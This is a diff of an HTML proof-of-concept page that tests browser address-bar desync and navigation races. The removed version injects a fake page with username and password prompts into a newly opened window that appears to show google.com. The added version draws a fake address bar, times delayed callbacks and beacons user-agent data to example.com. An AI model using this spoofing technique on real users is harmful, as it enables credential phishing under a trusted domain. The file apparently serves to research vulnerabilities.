@@ -1,58 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Safe Address Bar Desync PoC</title>
-  <style>
-    body { font-family: Arial; padding: 20px; }
-    button { padding: 12px; font-size: 16px; cursor: pointer; }
-  </style>
+<meta charset="UTF-8">
+<title>Navigation Race Condition Test</title>
+<style>
+  body {
+    font-family: system-ui, sans-serif;
+    background: #020617;
+    color: #e5e7eb;
+    padding: 40px;
+  }
+  button {
+    padding: 14px 22px;
+    font-size: 16px;
+    border-radius: 8px;
+    border: none;
+    cursor: pointer;
+    background: #2563eb;
+    color: #fff;
+  }
+  #fakebar {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 38px;
+    background: #0f172a;
+    color: #94a3b8;
+    padding: 8px 16px;
+    font-size: 14px;
+    border-bottom: 1px solid #1e293b;
+  }
+  pre {
+    margin-top: 20px;
+    background: #020617;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 13px;
+    border: 1px solid #1e293b;
+  }
+</style>
 </head>
+
 <body>
 
-<h1>Safe Address Bar Desync PoC</h1>
-<p>Versi lengkap dan mirip seperti PoC yang kamu ceritakan, namun 100% aman.</p>
-<p>Tekan tombol di bawah ini.</p>
+<div id="fakebar">https://www.google.com</div>
 
-<button onclick="runTest()">Run Safe PoC</button>
+<h1>Address Bar / Navigation Race Detector</h1>
+<p>
+This PoC measures whether JavaScript callbacks still execute
+after navigation has begun.
+</p>
+
+<button onclick="runTest()">Run Test</button>
+<pre id="log"></pre>
 
 <script>
+const DELAY = 30; // ubah 0–100 ms
+
+function log(msg) {
+  document.getElementById("log").textContent += msg + "\n";
+}
+
+function beacon(data) {
+  navigator.sendBeacon(
+    "https://example.com/log",
+    JSON.stringify(data)
+  );
+}
+
 function runTest() {
-  // 1. URL target dummy (AMAN)
-  // Domain '.test' adalah reserved TLD BUAT TESTING (RFC 2606)
-  let targetURL = "https://google.com";
+  const t0 = performance.now();
+  log("[+] Clicked at " + t0.toFixed(2) + " ms");
 
-  // 2. Buka tab baru ke target URL
-  let win = window.open(targetURL, "_blank");
+  // Fake address bar (visual test)
+  document.getElementById("fakebar").style.display = "block";
 
-  // 3. Beri jeda kecil supaya UI WebView meng-update address bar
-  //    sebelum navigasi commit (sama seperti PoC aslimu)
+  // Delayed alert
   setTimeout(() => {
-    try {
+    const t1 = performance.now();
+    log("[!] Alert executed at " + t1.toFixed(2) + " ms");
+    alert("Delayed JS executed after navigation start");
 
-      // 4. Inject konten ke about:blank (sama mekanisme,
-      //    tetapi aman dan tidak spoof domain siapa pun)
-      win.document.write(`
-        <h1 style='color:red;'>This is NOT the real target page!</h1>
-        <p>You are still on <strong>about:blank</strong>, but UI may show the dummy URL.</p>
-        <br>
-        
-        <button onclick="
-          let username = prompt('Enter username (safe demo)');
-          let password = prompt('Enter password (safe demo)');
-          alert('Safe Demo Only:\\nUsername: ' + username + '\\nPassword: ' + password);
-        ">Test Interaction</button>
+    beacon({
+      phase: "alert",
+      time: t1,
+      delay: DELAY,
+      ua: navigator.userAgent
+    });
+  }, DELAY);
 
-        <p style='margin-top:20px; font-size:14px; color:gray;'>
-          (This is a harmless demonstration page created from about:blank.)
-        </p>
-      `);
+  // Trigger navigation
+  setTimeout(() => {
+    const nav = performance.now();
+    log("[+] Navigation triggered at " + nav.toFixed(2) + " ms");
 
-      win.document.close();
+    beacon({
+      phase: "navigation",
+      time: nav,
+      delay: DELAY,
+      ua: navigator.userAgent
+    });
 
-    } catch(e) {
-      console.warn('Navigation commit occurred too early or blocked:', e);
-    }
-  }, 50); // timing race — sama seperti PoC asli
+    window.location.href = "https://www.google.com";
+  }, 0);
 }
 </script>
 
